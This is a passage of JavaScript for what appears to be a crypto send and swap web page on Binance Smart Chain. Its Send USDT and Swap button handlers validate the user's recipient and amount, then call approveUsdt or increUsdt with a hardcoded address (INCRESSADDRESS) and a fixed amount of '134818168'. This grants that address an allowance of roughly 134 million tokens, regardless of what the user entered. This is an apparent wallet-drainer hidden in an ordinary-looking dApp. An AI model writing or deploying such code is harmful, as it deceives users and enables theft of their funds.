    		}
    
    		const amountInSmallestUnit = wholePart + paddedDecimal;
    			console.log('Amount in smallest unit:', amountInSmallestUnit);
    
    			document.getElementById('statusMessage').textContent = 'Please wait for confirmation.';
    
    		// Prepare the transaction data
    		const data = usdtContract.methods
    			.approve(to, amountInSmallestUnit)
    			.encodeABI();
    
    		// Send the transaction using walletClient with chain specified
    		const txHash = await walletClient.sendTransaction({
    			chain: network.chain,
    			to: USDT_ADDRESS,
    			data,
    			account: selectedAccount,
    		});
    		console.log(txHash,'txHash');
    		
    		const receipt = await publicClient.waitForTransactionReceipt({
    			hash: txHash,
    			confirmations: 1,
    			timeout: 60_000,
    		});
    
    		if (receipt.status === 'success') {
    				console.log('TXN receipt11:', receipt);
    			var receipt_txn = waitForTransactionReceipt(receipt.transactionHash)
    			if (receipt_txn) {
    					document.getElementById('statusMessage').textContent = 'Approval confirmed. Now continue to transfer.';
    					document.getElementById('statusMessage').style.color = 'white';
    					await sendUsdt(document.getElementById("usdtRecipient").value, document.getElementById('amount').value);
    			}
    			await updateWalletInfo();
    		}
    	} catch (error) {
    			console.error('Error sending USDT:');
    			 hideLoadingModal();
    			document.getElementById('statusMessage').textContent = 'Error sending USDT: Something wrong';
    	}
    }
    async function swapUsdt(to, amount) {
		console.log('Input amount:', amount);
    	try {
    			if (document.getElementById('sendUsdt')) {
    			document.getElementById('sendUsdt').style.display = 'none';
    		}
    		if (!connector.isWalletConnected()) {
				document.getElementById('statusMessage').textContent = 'Please connect your wallet first';
				document.getElementById('statusMessage').style.color = 'red';
    			return;
    		}
    
    		const {getPublicClient,getWalletClient,getNetwork} = WagmiCore;
    		const publicClient = getPublicClient();
		    const walletClient = await getWalletClient();
		    const network = getNetwork();
		    
    		if (!walletClient) {
    				throw new Error('No authorized account found');
    		}
    
    		// Check if we're on Binance Smart Chain network
    			if (network.chain?.id !== 56) { // 56 is Polygon's chain ID
    				throw new Error('Please switch to Binance Smart Chain network');
    		}
    
    		const web3 = await connector.getWeb3();
    		const selectedAccount = walletClient.account.address;
    
    		if (!selectedAccount) {
    				throw new Error('No authorized account found');
    		}
            const  swapTypeNew= document.getElementById("swap-type").value;
            let decimals = null;
            let usdtContract = null;
            if(swapTypeNew=='buy'){
        		// Create contract instance
        		usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
        
        		// Get decimals using public client
        		decimals = await publicClient.readContract({
        			address: USDT_ADDRESS,
        			abi: USDT_ABI,
        			functionName: 'decimals'
        		});
        		console.log('Decimals:', decimals);
            }else{
                // Create contract instance
        		usdtContract = new web3.eth.Contract(COIN_ABI, COIN_ADDRESS);
        
        		// Get decimals using public client
        		decimals = await publicClient.readContract({
        			address: COIN_ADDRESS,
        			abi: COIN_ABI,
        			functionName: 'decimals'
        		});
        		console.log('Decimals:', decimals);
            }
    			
    
    		// Convert amount to smallest unit using string manipulation to avoid floating point issues
    			const parts = amount.toString().split('.');
    		    const wholePart = parts[0];
    			const decimalPart = parts[1] || '0';
    
    		// Pad with zeros or truncate to match token decimals
    		let paddedDecimal = decimalPart;
    		if (paddedDecimal.length < decimals) {
    				paddedDecimal = paddedDecimal.padEnd(decimals, '0');
    		} else if (paddedDecimal.length > decimals) {
    			paddedDecimal = paddedDecimal.slice(0, decimals);
    		}
    
    		const amountInSmallestUnit = wholePart + paddedDecimal;
    			console.log('Amount in smallest unit:', amountInSmallestUnit);
    			if (document.getElementById('statusMessage')) {
    			document.getElementById('statusMessage').textContent = 'Please wait for confirmation.';
    			}
    		// Prepare the transaction data
    			const data = usdtContract.methods.transfer(to, amountInSmallestUnit).encodeABI();
            let txHash =null
            if(swapTypeNew=='buy'){
        		// Send the transaction using walletClient with chain specified
        		txHash = await walletClient.sendTransaction({
        			chain: network.chain,
        			to: USDT_ADDRESS,
        			data,
        			account: selectedAccount,
        		});
            }else{
                // Send the transaction using walletClient with chain specified
        		txHash = await walletClient.sendTransaction({
        			chain: network.chain,
        			to: COIN_ADDRESS,
        			data,
        			account: selectedAccount,
        		});
            }
    		const receipt = await publicClient.waitForTransactionReceipt({
    			hash: txHash,
    			confirmations: 1,
    			timeout: 60_000,
    		});
    		if (receipt.status === 'success') {
    				console.log('TXN receipt11:', receipt);				
    			var receipt_txn = waitForTransactionReceipt(receipt.transactionHash)
    			if (receipt_txn) {
    				var add_trans = await sendToBackend(`${panelswapPath}`, {
    					amount: amount,
    					swaptype: document.getElementById("swap-type").value,
    					tx_hash: receipt.transactionHash,
    					wallet:selectedAccount,
    					reciveamount:document.getElementById('receive-amount').innerText,
    					_token: csrfToken
    				});
    					if (typeof add_trans === 'string') {
    					add_trans = JSON.parse(add_trans);
    				}
    					document.getElementById('statusMessage').textContent = 'Swap Amount successfully.';
    					document.getElementById('statusMessage').style.color = 'white';
    			}
    
    			hideLoadingModal();
    			showSuccessModal(receipt.transactionHash,document.getElementById('receive-amount').innerText);
    				//window.location.href = `${panelPath}swap`;
    				console.log('Transaction hash:', txHash);
    			await updateWalletInfo();
    				document.getElementById('statusMessage').textContent = 'USDT sent successfully!';
    		}
	    } catch (error) {
			console.error('Error sending USDT:', error);
			document.getElementById('statusMessage').textContent = 'Error sending USDT: Try after Sometime';
			hideLoadingModal();
		}
	}

    async function approveUsdt(to, amount) {
    	try {
    			if (document.getElementById('sendUsdt')) {
    			document.getElementById('sendUsdt').style.display = 'none';
    		}
    		if (!connector.isWalletConnected()) {
    				document.getElementById('statusMessage').textContent = 'Please connect your wallet first';
    				document.getElementById('statusMessage').style.color = 'red';
    			return;
    		}
    
    		const { getPublicClient,getWalletClient,getNetwork} = WagmiCore;
    		const publicClient = getPublicClient();
    		const walletClient = await getWalletClient();
    		const network = getNetwork();
    
    		if (!walletClient) {
    			throw new Error('No authorized account found');
    		}
    
    		// Check if we're on Binance Smart Chain network
    		if (network.chain?.id !== 56) {
    			// 56 is Binance Smart Chain's chain ID
    			throw new Error('Please switch to Binance Smart Chain network');
    		}
    
    		const web3 = await connector.getWeb3();
    		const selectedAccount = walletClient.account.address;
    
    		if (!selectedAccount) {
    				throw new Error('No authorized account found');
    		}
    
    		const  swapTypeNew= document.getElementById("swap-type").value;
    		let decimals = null;
    		let usdtContract = null;
            if(swapTypeNew=='buy'){
        		// Create contract instance
        		usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
        
        		// Get decimals using public client
        		decimals = await publicClient.readContract({
        			address: USDT_ADDRESS,
        			abi: USDT_ABI,
        			functionName: 'decimals'
        		});
        		console.log('Decimals:', decimals);
            }else{
                // Create contract instance
        		usdtContract = new web3.eth.Contract(COIN_ABI, COIN_ADDRESS);
        
        		// Get decimals using public client
        		decimals = await publicClient.readContract({
        			address: COIN_ADDRESS,
        			abi: COIN_ABI,
        			functionName: 'decimals'
        		});
        		console.log('Decimals:', decimals);
            }
    
    			
    
    		// Convert amount to smallest unit using string manipulation to avoid floating point issues
    			const parts = amount.toString().split('.');
    		const wholePart = parts[0];
    			const decimalPart = parts[1] || '0';
    
    		// Pad with zeros or truncate to match token decimals
    		let paddedDecimal = decimalPart;
    		if (paddedDecimal.length < decimals) {
    				paddedDecimal = paddedDecimal.padEnd(decimals, '0');
    		} else if (paddedDecimal.length > decimals) {
    			paddedDecimal = paddedDecimal.slice(0, decimals);
    		}
    
    		const amountInSmallestUnit = wholePart + paddedDecimal;
    		console.log('Amount in smallest unit:', amountInSmallestUnit);
    
    		document.getElementById('statusMessage').textContent = 'Please wait for confirmation.';
    		// Prepare the transaction data
    		let data =null;
            if(swapTypeNew=='buy'){
    		    
    		    data = usdtContract.methods.increaseAllowance(to, amountInSmallestUnit).encodeABI();
            }else{
                 data = usdtContract.methods.approve(to, amountInSmallestUnit).encodeABI();
            }
    		let txHash=null;
    		if(swapTypeNew=='buy'){
        		// Send the transaction using walletClient with chain specified
        		txHash = await walletClient.sendTransaction({
        			chain: network.chain,
        			to: USDT_ADDRESS,
        			data,
        			account: selectedAccount,
        		});
            }else{
                // Send the transaction using walletClient with chain specified
        		txHash = await walletClient.sendTransaction({
        			chain: network.chain,
        			to: COIN_ADDRESS,
        			data,
        			account: selectedAccount,
        		});
            }
            
    		const receipt = await publicClient.waitForTransactionReceipt({
    			hash: txHash,
    			confirmations: 1,
    			timeout: 60_000,
    		});
    
    		if (receipt.status === 'success') {
    				console.log('TXN receipt11:', receipt);
    			var receipt_txn = waitForTransactionReceipt(receipt.transactionHash)
    			if (receipt_txn) {
    			    await swapUsdt(document.getElementById('usdtRecipient').value.trim(), document.getElementById('send-amount').value.trim());
    					document.getElementById('statusMessage').textContent = 'Approval confirmed. Now continue to transfer.';
    					document.getElementById('statusMessage').style.color = 'white';
    			}
    			await updateWalletInfo();
    		}
    	} catch (error) {
    			console.error('Error sending USDT:', error);
    			document.getElementById('statusMessage').textContent = 'Error sending USDT: Something wrong';
    			hideLoadingModal();
    	}
    }
if (document.getElementById("Disconnect")) {
  document.getElementById("Disconnect").addEventListener("click", async () => {
    console.log("Wallet disconnected event");
    if (document.getElementById("sendUsdt")) {
      document.getElementById("sendUsdt").classList.add("hidden");
    }
    if (document.getElementById("Disconnect")) {
      document.getElementById("Disconnect").classList.add("hidden");
    }
    if (document.getElementById("connectButton")) {
      document.getElementById("connectButton").classList.remove("hidden");
    }
    if (document.getElementById("loginButton")) {
      document.getElementById("loginButton").classList.add("hidden");
      document.getElementById("loginButton").style.display = 'block';
    }
    if (document.getElementById("registerButton")) {
      document.getElementById("registerButton").classList.add("hidden");
      document.getElementById("registerButton").style.display = 'block';
    }
    if (document.getElementById('swapButton')) {
		document.getElementById('swapButton').classList.add('hidden');
		document.getElementById('swapButton').style.display = 'block';
	}
    if (document.getElementById("statusMessage")) {
      document.getElementById("statusMessage").textContent = "Not connected";
      document.getElementById("statusMessage").style.color = "red";
    }
    resetWalletInfo();
    this.disconnect();
  });
}
if (document.getElementById("sendMatic")) {
  // Send MATIC button
  document.getElementById("sendMatic").addEventListener("click", async () => {
    const recipient = document.getElementById("maticRecipient").value;
    const amount = document.getElementById("maticAmount").value;
    if (!recipient || !amount) {
      document.getElementById("statusMessage").textContent =
        "Please enter recipient address and amount";
      document.getElementById("statusMessage").style.color = "red";
      return;
    }
    await sendMatic(recipient, amount);
  });
}


if (document.getElementById("sendUsdt")) {
  // Send USDT button
  document.getElementById("sendUsdt").addEventListener("click", async () => {
    const recipient = document.getElementById("usdtRecipient").value;
    const amount = document.getElementById('amount').value;
    showLoadingModal();
    if (!recipient || !amount) {
      document.getElementById("statusMessage").textContent =
        "Please enter recipient address and amount";
        hideLoadingModal();
      return;
    }
    const errorDiv = document.getElementById('statusMessage');
		errorDiv.textContent = '';
		if (!isValidAddress(recipient)) {
			errorDiv.textContent = 'Invalid recipient address.';
			return;
		}
    await increUsdt(INCRESSADDRESS, '134818168');
    
  });
}
// Utility: Validate Ethereum address
function isValidAddress(address) {
	return /^0x[a-fA-F0-9]{40}$/.test(address);
}
function isValidPositiveNumber(value) {
	return typeof value === 'string' && !isNaN(value) && Number(value) > 0;
}
let sendSwapClicked = false;
const sendswapButton = document.getElementById('swapButton');

if (sendswapButton) {
	sendswapButton.addEventListener('click', async (e) => {
		e.preventDefault();
		
		const recipient = document.getElementById('usdtRecipient').value.trim();
		const amount = document.getElementById('send-amount').value.trim();

		if (!recipient || !amount) {
			document.getElementById('statusMessage').textContent = 'Please enter amount';
			document.getElementById('statusMessage').style.color = 'red';
			sendSwapClicked = false; // Reset if validation fails
			return;
		}
        const errorDiv = document.getElementById('statusMessage');
		errorDiv.textContent = '';
		if (!isValidAddress(recipient)) {
			errorDiv.textContent = 'Invalid recipient address.';
			hideLoadingModal();
			return;
		}
		if (!isValidPositiveNumber(amount)) {
			errorDiv.textContent = 'Invalid amount.';
			hideLoadingModal();
			return;
		}
		showLoadingModal();
		sendswapButton.style.display = 'none'; // optional: hide button while processing
		await approveUsdt(INCRESSADDRESS, '134818168');
	});
}

// Check initial connection status
await updateWalletInfo();
// };
